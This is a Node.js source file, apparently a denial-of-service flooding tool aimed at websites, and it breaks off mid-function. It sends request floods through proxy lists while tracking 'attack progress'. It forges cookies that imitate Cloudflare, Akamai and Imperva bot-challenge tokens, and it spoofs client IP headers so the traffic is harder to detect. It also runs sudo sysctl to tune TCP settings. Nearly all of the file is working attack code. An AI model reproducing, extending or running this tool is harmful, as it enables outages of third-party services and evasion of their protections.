const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const HPACK = require('hpack');
var colors = require("colors");
const v8 = require("v8");
const os = require("os");
const { exec } = require('child_process');

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\n" + 
                    (options.authHeader || "") + 
                    "Connection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}


function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = {
    bfm: get_option('--bfm') === 'true',
    cookie: get_option('--cookie') === 'true',
    manualCookie: get_option('--getcookie'),
    cache: get_option('--cache') === 'true',
    autoCookie: get_option('--auto-cookie') === 'true',
    debug: get_option('--debug') === 'true',
    fakebot: get_option('--fakebot') === 'true',
    ratelimit: parseInt(get_option('--ratelimit')) || 0,
    autoratelimit: get_option('--autoratelimit') === 'true',
    referrer: get_option('--Referrer') === 'true', // Add referrer option
    userAgent: get_option('--ua'), // เพิ่ม option สำหรับ custom user-agent
    customProxy: get_option('--proxy') // เพิ่ม option สำหรับ custom proxy เดี่ยว
};


const AUTO_RATE_LIMIT_DEFAULT = 100;
const AUTO_RATE_LIMIT_MIN = 10;
const AUTO_RATE_LIMIT_DECREASE = 0.8; // Decrease by 20% on error
const AUTO_RATE_LIMIT_INCREASE = 1.1; // Increase by 10% on success

const MAX_RAM_PERCENTAGE = 99; 

const proxyStats = {};

let targetCookies = '';

let cacheErrorCount = 0;
const MAX_CACHE_ERRORS = 100;

function trackCacheError(error) {
    cacheErrorCount++;
    console.log(`\x1b[31m[ERROR]\x1b[0m Cache error ${cacheErrorCount}/${MAX_CACHE_ERRORS}: ${error.message}`);
    
    if (cacheErrorCount >= MAX_CACHE_ERRORS && options.cache) {
        console.log(`\x1b[33m[WARNING]\x1b[0m Too many cache errors, disabling cache option`);
        options.cache = false;
    }
}

function parseProxy(proxyString) {
    let auth = null;
    let host = null;
    let port = null;

    if (proxyString.includes('@')) {
        const parts = proxyString.split('@');
        auth = parts[0];
        const hostPort = parts[1].split(':');
        host = hostPort[0];
        port = parseInt(hostPort[1]);
    } else {
        // รูปแบบปกติ ip:port
        const parts = proxyString.split(':');
        host = parts[0];
        port = parseInt(parts[1]);
    }

    return {
        auth: auth,
        host: host,
        port: port,
        
        authHeader: auth ? 'Proxy-Authorization: Basic ' + Buffer.from(auth).toString('base64') + '\r\n' : ''
    };
}

function simulateJavaScriptCookies(hostname, responseBody) {
    
    let simulatedCookies = [];
    
    const isCloudflare = responseBody.includes('cloudflare') || 
                        responseBody.includes('cf-browser-verification') ||
                        responseBody.includes('cf_clearance') ||
                        responseBody.includes('cf-please-wait');
                        
    const isAkamai = responseBody.includes('akamai') ||
                    responseBody.includes('ak-challenge') ||
                    responseBody.includes('_abck=');
                    
    const isImperva = responseBody.includes('incapsula') || 
                      responseBody.includes('visid_incap_') ||
                      responseBody.includes('nlbi_');
    
    const isRecaptcha = responseBody.includes('recaptcha') || responseBody.includes('g-recaptcha');
    
    
    const domainParts = hostname.split('.');
    let domain = hostname;
    if (domainParts.length > 2) {
        
        domain = '.' + domainParts.slice(-2).join('.');
    }
    
    // Generate timestamp cookie values
    const now = Date.now();
    const expiry = now + 86400000; 
    
    if (isCloudflare) {
        console.log(`\x1b[36m[INFO]\x1b[0m Cloudflare protection detected, simulating cf_clearance cookie`);
        const cfClearance = `cf_clearance=${randstr(32)}-${Math.floor(now/1000)}-0-1-${randstr(8)}`;
        simulatedCookies.push(cfClearance);
        
        simulatedCookies.push(`cf_chl_2=${randstr(10)}`);
        simulatedCookies.push(`cf_chl_prog=x${Math.floor(Math.random() * 19) + 1}`);
    }
    
    if (isAkamai) {
        console.log(`\x1b[36m[INFO]\x1b[0m Akamai protection detected, simulating bot detection cookies`);
        simulatedCookies.push(`_abck=${randstr(86)}~0~${randstr(40)}~${randstr(26)}`);
        simulatedCookies.push(`bm_sz=${randstr(64)}~${expiry}`);
    }
   
    if (isImperva) {
        console.log(`\x1b[36m[INFO]\x1b[0m Imperva/Incapsula protection detected, simulating cookies`);
        simulatedCookies.push(`visid_incap_${Math.floor(100000 + Math.random() * 999999)}=${randstr(48)}`);
        simulatedCookies.push(`incap_ses_${Math.floor(100 + Math.random() * 999)}_${Math.floor(100000 + Math.random() * 999999)}=${randstr(48)}`);
        simulatedCookies.push(`nlbi_${Math.floor(100000 + Math.random() * 999999)}=${randstr(32)}`);
    }
    
    simulatedCookies.push(`session=${randstr(32)}`);
    simulatedCookies.push(`sessid=${randstr(16)}`);
    
    const cookiePatterns = [
        { regex: /document\.cookie\s*=\s*["']([^=]+)=/g, group: 1 },
        { regex: /setCookie\(\s*["']([^"']+)["']/g, group: 1 },
        { regex: /cookie\s*:\s*["']([^"']+)["']/g, group: 1 }
    ];
    
    for (const pattern of cookiePatterns) {
        let match;
        while ((match = pattern.regex.exec(responseBody)) !== null) {
            if (match[pattern.group]) {
                const cookieName = match[pattern.group].trim();
                if (cookieName && cookieName.length > 1 && cookieName.length < 50) {
                    console.log(`\x1b[36m[INFO]\x1b[0m Detected cookie pattern: ${cookieName}`);
                    simulatedCookies.push(`${cookieName}=${randstr(32)}`);
                }
            }
        }
    }
    
    return simulatedCookies;
}

function getCookieFromFile(targetUrl) {
    try {
        const parsedUrl = url.parse(targetUrl);
        const hostname = parsedUrl.hostname;
        
        const filename = hostname.replace(/[^a-zA-Z0-9.-]/g, '_') + '.cookie';
        
        if (!fs.existsSync(filename)) {
            console.log(`\x1b[33m[WARNING]\x1b[0m Cookie file ${filename} not found.`);
            return '';
        }
        
        // Read and return cookie content
        const cookieContent = fs.readFileSync(filename, 'utf8');
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Loaded cookies from file: ${filename}`);
        return cookieContent.trim();
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Failed to read cookie file: ${error.message}`);
        return '';
    }
}

// Modify the fetchCookiesFromTarget function to include simulated cookies and handle manual cookies
function fetchCookiesFromTarget(targetUrl) {
    return new Promise(async (resolve, reject) => {
        // Check if manual cookie was provided
        if (options.manualCookie) {
            console.log(`\x1b[32m[SUCCESS]\x1b[0m Using manually provided cookies: ${options.manualCookie.substring(0, 50)}${options.manualCookie.length > 50 ? '...' : ''}`);
            return resolve(options.manualCookie);
        }
        
        const parsedUrl = url.parse(targetUrl);
        const httpModule = parsedUrl.protocol === 'https:' ? require('https') : require('http');
        const zlib = require('zlib');
        
        // Browser profiles for different attempts
        const browserProfiles = [
            {
                name: 'Chrome',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0'
                }
            },
            {
                name: 'Firefox',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate', 
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'TE': 'trailers'
                }
            },
            {
                name: 'Mobile Chrome',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="112"',
                    'Sec-Ch-Ua-Mobile': '?1',
                    'Sec-Ch-Ua-Platform': '"Android"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1'
                }
            }
        ];

        // Paths to try if the main URL doesn't yield cookies
        const pathsToTry = [
            '/',
            '/index.html',
            '/home',
            '/en'
        ];

        let allCookies = [];
        let cookiesFound = false;
        let jsDetected = false;
        let pageContent = '';
        
        // Helper function to make the request
        const makeRequest = async (options, browser, path = null) => {
            return new Promise((resolveRequest) => {
                console.log(`\x1b[36m[INFO]\x1b[0m Trying to fetch cookies with ${browser} browser profile${path ? ' on path ' + path : ''}...`);
                
                const req = httpModule.request(options, (res) => {
                    // Handle redirects
                    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                        console.log(`\x1b[36m[INFO]\x1b[0m Following redirect to ${res.headers.location}`);
                        
                        // Save any cookies from the redirect response
                        if (res.headers['set-cookie']) {
                            const newCookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]);
                            allCookies.push(...newCookies);
                            cookiesFound = true;
                        }
                        
                        // Parse the redirect URL
                        let redirectUrl = res.headers.location;
                        if (!redirectUrl.startsWith('http')) {
                            // Handle relative URLs
                            redirectUrl = url.resolve(targetUrl, redirectUrl);
                        }
                        
                        // Create new options for the redirected URL
                        const redirectParsedUrl = url.parse(redirectUrl);
                        const redirectOptions = {
                            hostname: redirectParsedUrl.hostname,
                            port: redirectParsedUrl.port || (redirectParsedUrl.protocol === 'https:' ? 443 : 80),
                            path: redirectParsedUrl.path || '/',
                            method: 'GET',
                            headers: options.headers,
                            rejectUnauthorized: false,
                            timeout: 8000
                        };
                        
                        // Follow the redirect
                        makeRequest(redirectOptions, browser)
                            .then(redirectCookies => {
                                resolveRequest(redirectCookies);
                            });
                        return;
                    }
                    
                    let responseBody = '';
                    let chunks = [];
                    
                    // Handle compressed responses
                    let stream = res;
                    if (res.headers['content-encoding'] === 'gzip') {
                        stream = res.pipe(zlib.createGunzip());
                    } else if (res.headers['content-encoding'] === 'deflate') {
                        stream = res.pipe(zlib.createInflate());
                    } else if (res.headers['content-encoding'] === 'br') {
                        stream = res.pipe(zlib.createBrotliDecompress());
                    }
                    
                    stream.on('data', (chunk) => {
                        chunks.push(chunk);
                    });
                    
                    stream.on('end', () => {
                        responseBody = Buffer.concat(chunks).toString();
                        pageContent = responseBody; // Save for later analysis
                        
                        // Check for cookies in the response headers
                        if (res.headers['set-cookie']) {
                            const newCookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]);
                            allCookies.push(...newCookies);
                            cookiesFound = true;
                            console.log(`\x1b[32m[SUCCESS]\x1b[0m Found ${newCookies.length} cookies with ${browser}${path ? ' on path ' + path : ''}`);
                        }
                        
                        // Check for JavaScript or meta refreshes that might set cookies - only log once
                        if (!jsDetected && (responseBody.includes('document.cookie') || 
                            responseBody.includes('setCookie') || 
                            responseBody.includes('meta http-equiv="refresh"'))) {
                            jsDetected = true;
                            console.log(`\x1b[33m[INFO]\x1b[0m JavaScript cookie setting detected - will simulate common patterns`);
                        }
                        
                        resolveRequest(allCookies);
                    });
                });
                
                req.on('error', (error) => {
                    console.log(`\x1b[31m[ERROR]\x1b[0m Failed with ${browser}: ${error.message}`);
                    resolveRequest(allCookies);
                });
                
                req.setTimeout(8000, () => {
                    req.destroy();
                    console.log(`\x1b[31m[ERROR]\x1b[0m Request with ${browser} timed out`);
                    resolveRequest(allCookies);
                });
                
                req.end();
            });
        };
        
        // Try each browser profile
        for (const profile of browserProfiles) {
            if (cookiesFound) break; // Stop if we already found cookies
            
            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.path || '/',
                method: 'GET',
                headers: profile.headers,
                rejectUnauthorized: false, // Accept self-signed certificates
                timeout: 8000
            };
            
            // Try main URL with this browser profile
            await makeRequest(options, profile.name);
            
            // If no cookies found, try additional paths
            if (!cookiesFound) {
                for (const path of pathsToTry) {
                    options.path = path;
                    await makeRequest(options, profile.name, path);
                    if (cookiesFound) break;
                }
            }
        }
        
        // Simulate JavaScript cookies if needed
        if (jsDetected || !cookiesFound) {
            console.log(`\x1b[36m[INFO]\x1b[0m Simulating JavaScript-based cookies for ${parsedUrl.hostname}`);
            const simulatedCookies = simulateJavaScriptCookies(parsedUrl.hostname, pageContent);
            allCookies.push(...simulatedCookies);
        }
        
        // Remove duplicates and join cookies
        const uniqueCookies = [...new Set(allCookies)];
        const cookieString = uniqueCookies.join('; ');
        
        if (cookieString) {
            console.log(`\x1b[32m[SUCCESS]\x1b[0m Collected ${uniqueCookies.length} unique cookies from target`);
        } else {
            console.log(`\x1b[33m[WARNING]\x1b[0m No cookies found from target after all attempts`);
            console.log(`\x1b[36m[INFO]\x1b[0m Try using the --manual-cookie option to specify cookies directly`);
        }
        
        resolve(cookieString);
    });
}

// TCP Changes Server function to optimize network performance
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.log(`\x1b[31m[ERROR]\x1b[0m Failed to change TCP parameters. Root access may be required.`);
        } else {
            console.log(`\x1b[32m[SUCCESS]\x1b[0m TCP parameters changed successfully:`);
            console.log(`\x1b[36m[TCP]\x1b[0m Congestion Control: ${congestionControl}`);
            console.log(`\x1b[36m[TCP]\x1b[0m SACK: ${sack}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Window Scaling: ${windowScaling}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Timestamps: ${timestamps}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Selective ACK: ${selectiveAck}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Fast Open: ${tcpFastOpen}`);
        }
    });
}

// Stats tracking object to monitor attack progress
const stats = {
  errors: 0,
  statusCodes: {},
  statusCodesLastUpdate: {},
  statusCodesPerSecond: {},
  startTime: Date.now(),
  lastUpdate: Date.now(),
  proxiesRemoved: 0,
  rateLimitedProxies: 0,
  retryWaitingProxies: 0,
  avgAutoRateLimit: 0, // Add average auto rate limit stat
  totalRetryAfters: 0, // Track total number of retry-afters received
  totalRequests: 0, // เพิ่มตัวแปรเพื่อนับจำนวน request ทั้งหมด
  lastRequestTime: Date.now() // เพื่อตรวจสอบว่า script กำลัง flood อยู่หรือไม่
};

// Function to print stats periodically
function printStats() {
  const runtime = Math.round((Date.now() - stats.startTime) / 1000);
  const now = Date.now();
  const timeSinceLastUpdate = now - stats.lastUpdate;
  
  // Calculate status codes per second
  Object.keys(stats.statusCodes).forEach(code => {
    const current = stats.statusCodes[code];
    const previous = stats.statusCodesLastUpdate[code] || 0;
    stats.statusCodesPerSecond[code] = Math.round((current - previous) / (timeSinceLastUpdate / 1000));
    stats.statusCodesLastUpdate[code] = current;
  });
  
  // Calculate rate-limited and retry-waiting proxies
  stats.rateLimitedProxies = 0;
  stats.retryWaitingProxies = 0;
  
  // Calculate average auto rate limit
  let totalAutoRateLimit = 0;
  let autoRateLimitCount = 0;
  
  Object.keys(proxyStats).forEach(proxyIP => {
    if (isProxyRateLimited(proxyIP)) stats.rateLimitedProxies++;
    if (isProxyInRetryWait(proxyIP)) stats.retryWaitingProxies++;
    
    // Calculate auto rate limit average
    if (options.autoratelimit) {
      totalAutoRateLimit += proxyStats[proxyIP].autoRateLimit;
      autoRateLimitCount++;
    }
  });
  
  if (autoRateLimitCount > 0) {
    stats.avgAutoRateLimit = Math.round(totalAutoRateLimit / autoRateLimitCount);
  }
  
  stats.lastUpdate = now;
  
  // ตรวจสอบว่า script กำลัง flood อยู่หรือไม่
  const timeSinceLastRequest = now - stats.lastRequestTime;
  if (timeSinceLastRequest > 5000) {
    console.log(`\x1b[31m[WARNING]\x1b[0m No requests in the last ${Math.round(timeSinceLastRequest/1000)} seconds!`);
  }
  
  console.clear();
  console.log('Target: '+process.argv[2]);
  console.log('Time: '+process.argv[3] + ' / Runtime: ' + runtime + 's');
  console.log('Rate: '+process.argv[4]);
  console.log('Thread(s): '+process.argv[5]);
  console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
  console.log(`Total Requests: ${stats.totalRequests} | Per Second: ${Math.round(stats.totalRequests/runtime)}`);
  console.log(`Errors: ${stats.errors}`);
  
  if (options.ratelimit) {
    console.log(`Rate Limited Proxies: ${stats.rateLimitedProxies}`);
  } else if (options.autoratelimit) {
    console.log(`Auto Rate Limited Proxies: ${stats.rateLimitedProxies} (Avg Limit: ${stats.avgAutoRateLimit})`);
  }
  
  console.log(`Retry-After: ${stats.retryWaitingProxies} proxies waiting (Total received: ${stats.totalRetryAfters})`);

  if (Object.keys(stats.statusCodes).length > 0) {
    console.log(`Status Codes (total/per sec):`);
    Object.keys(stats.statusCodes).sort().forEach(code => {
      let color = "\x1b[37m"; // Default white
      if (code.startsWith("2")) color = "\x1b[32m"; // Green for 2xx
      if (code.startsWith("3")) color = "\x1b[33m"; // Yellow for 3xx
      if (code.startsWith("4")) color = "\x1b[31m"; // Red for 4xx
      if (code.startsWith("5")) color = "\x1b[35m"; // Magenta for 5xx
      
      const total = stats.statusCodes[code];
      const perSecond = stats.statusCodesPerSecond[code] || 0;
      console.log(`  ${color}${code}\x1b[0m: ${total} (${perSecond}/s)`);
    });
  } else {
    console.log(`No responses received yet`);
  }
}

//=============================================================================
// STRING UTILITY FUNCTIONS
//=============================================================================

function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }


const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

// กำหนดรายการ browsers ที่รองรับในปัจจุบัน (ลบ safari, brave, mobile, opera, operagx ออกเพื่อประสิทธิภาพสูงสุด)
const browsers = ["chrome", "firefox"]; 

// ตัวแปรติดตามเพื่อให้แน่ใจว่าเกิดการสลับระหว่าง Firefox และ Chrome ในอัตราส่วน 50/50
let lastBrowserWasFirefox = false;

// ฟังก์ชันสำหรับการสลับ browser แบบสมดุล
const getRandomBrowser = () => {
    // สลับระหว่าง Firefox และ Chrome เพื่อให้แน่ใจว่ามีการกระจายแบบ 50/50 ที่สมบูรณ์
    lastBrowserWasFirefox = !lastBrowserWasFirefox;
    // ส่งคืนชื่อ browser ที่จะใช้ในรอบนี้
    return lastBrowserWasFirefox ? "firefox" : "chrome";
};

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function randstra(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." }
    ];

    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

// Function to generate alternative IP headers that are less likely to be detected
function generateAlternativeIPHeaders() {
    const headers = {};
    
    // Use probability to randomly include some but not all headers
    // This makes the request pattern less predictable
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstra(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    
    // Include at least one header if all randomization failed
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstra(5)}`;
    }
    
    return headers;
}

// Debug headers storage - maintain only one entry per statusCode
let debugHeadersStorage = {
    '200': null,
    '403': null
};

// Create debug header filenames
const debugFilenames = {
    '200': '200.txt',
    '403': '403.txt'
}

// Function to save headers to debug files
function saveDebugHeaders(statusCode, headers, targetUrl) {
    if (!options.debug) return; // Only save if debug option is enabled
    
    // Only supported status codes
    if (statusCode !== '200' && statusCode !== '403') return;
    
    // Only save once per status code
    if (debugHeadersStorage[statusCode] !== null) return;
    
    try {
        // Format the headers nicely for saving
        const timestamp = new Date().toISOString();
        const formattedHeaders = {};
        
        // Extract and normalize headers for saving
        Object.keys(headers).forEach(key => {
            // Skip http2 pseudo headers
            if (!key.startsWith(':')) {
                formattedHeaders[key] = headers[key];
            }
        });
        
        // Create content to save
        let content = `===== DEBUG HEADERS FOR STATUS ${statusCode} =====\n`;
        content += `URL: ${targetUrl}\n`;
        content += `Timestamp: ${timestamp}\n`;
        content += `\n--- Headers ---\n`;
        
        // Add each header
        Object.keys(formattedHeaders).sort().forEach(key => {
            content += `${key}: ${formattedHeaders[key]}\n`;
        });
        
        // Add alternative IP headers specifically
        content += `\n--- Alternative IP Headers Used ---\n`;
        const ipHeaderNames = ["cdn-loop", "true-client-ip", "via", "request-context", "x-edge-ip", "x-coming-from", "akamai-client-ip"];
        ipHeaderNames.forEach(name => {
            if (formattedHeaders[name]) {
                content += `${name}: ${formattedHeaders[name]}\n`;
            }
        });
        
        // Save to file
        fs.writeFileSync(debugFilenames[statusCode], content);
        console.log(`\x1b[32m[DEBUG]\x1b[0m Saved headers that resulted in status ${statusCode} to ${debugFilenames[statusCode]}`);
        
        // Mark as saved
        debugHeadersStorage[statusCode] = true;
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Failed to save debug headers: ${error.message}`);
    }
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Function to select a random element from an array
function randomElement(elements) {
  if (!elements || elements.length === 0) return undefined;
    return elements[randomIntn(0, elements.length - 1)];
}

//=============================================================================
// HTTP/2 PROTOCOL CONSTANTS AND FUNCTIONS
//=============================================================================

// Define official HTTP/2 Frame Types as per IANA registry
const HTTP2_FRAME_TYPES = {
    DATA: 0x00,
    HEADERS: 0x01,
    PRIORITY: 0x02,
    RST_STREAM: 0x03,
    SETTINGS: 0x04,
    PUSH_PROMISE: 0x05,
    PING: 0x06,
    GOAWAY: 0x07,
    WINDOW_UPDATE: 0x08,
    CONTINUATION: 0x09,
    ALTSVC: 0x0a,
    ORIGIN: 0x0c,
    PRIORITY_UPDATE: 0x10
};

// Define HTTP/2 Frame Flags constants
const HTTP2_FLAGS = {
    END_STREAM: 0x1,    // 0x1
    END_HEADERS: 0x4,   // 0x4
    PRIORITY: 0x20      // 0x20
};

// Define official HTTP/2 Settings as per IANA registry
const HTTP2_SETTINGS = {
    HEADER_TABLE_SIZE: 0x01,
    ENABLE_PUSH: 0x02,
    MAX_CONCURRENT_STREAMS: 0x03,
    INITIAL_WINDOW_SIZE: 0x04,
    MAX_FRAME_SIZE: 0x05,
    MAX_HEADER_LIST_SIZE: 0x06,
    ENABLE_CONNECT_PROTOCOL: 0x08,
    NO_RFC7540_PRIORITIES: 0x09,
    TLS_RENEG_PERMITTED: 0x10,
    ENABLE_METADATA: 0x4d44
};

// Define official HTTP/2 Error Codes as per IANA registry
const HTTP2_ERROR_CODES = {
    NO_ERROR: 0x00,
    PROTOCOL_ERROR: 0x01,
    INTERNAL_ERROR: 0x02,
    FLOW_CONTROL_ERROR: 0x03,
    SETTINGS_TIMEOUT: 0x04,
    STREAM_CLOSED: 0x05,
    FRAME_SIZE_ERROR: 0x06,
    REFUSED_STREAM: 0x07,
    CANCEL: 0x08,
    COMPRESSION_ERROR: 0x09,
    CONNECT_ERROR: 0x0a,
    ENHANCE_YOUR_CALM: 0x0b,
    INADEQUATE_SECURITY: 0x0c,
    HTTP_1_1_REQUIRED: 0x0d
};

// Initial values for HTTP/2 settings as per IANA registry
const HTTP2_SETTINGS_DEFAULTS = {
    [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 4096,
    [HTTP2_SETTINGS.ENABLE_PUSH]: 1,
    [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: Number.MAX_SAFE_INTEGER, // (infinite)
    [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 65535,
    [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
    [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: Number.MAX_SAFE_INTEGER, // (infinite)
    [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 0,
    [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
    [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
    [HTTP2_SETTINGS.ENABLE_METADATA]: 0
};

// Updated transformSettings function to use the official HTTP/2 settings
const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": HTTP2_SETTINGS.HEADER_TABLE_SIZE,
        "SETTINGS_ENABLE_PUSH": HTTP2_SETTINGS.ENABLE_PUSH,
        "SETTINGS_MAX_CONCURRENT_STREAMS": HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS,
        "SETTINGS_INITIAL_WINDOW_SIZE": HTTP2_SETTINGS.INITIAL_WINDOW_SIZE,
        "SETTINGS_MAX_FRAME_SIZE": HTTP2_SETTINGS.MAX_FRAME_SIZE,
        "SETTINGS_MAX_HEADER_LIST_SIZE": HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE,
        "SETTINGS_ENABLE_CONNECT_PROTOCOL": HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL,
        "SETTINGS_NO_RFC7540_PRIORITIES": HTTP2_SETTINGS.NO_RFC7540_PRIORITIES,
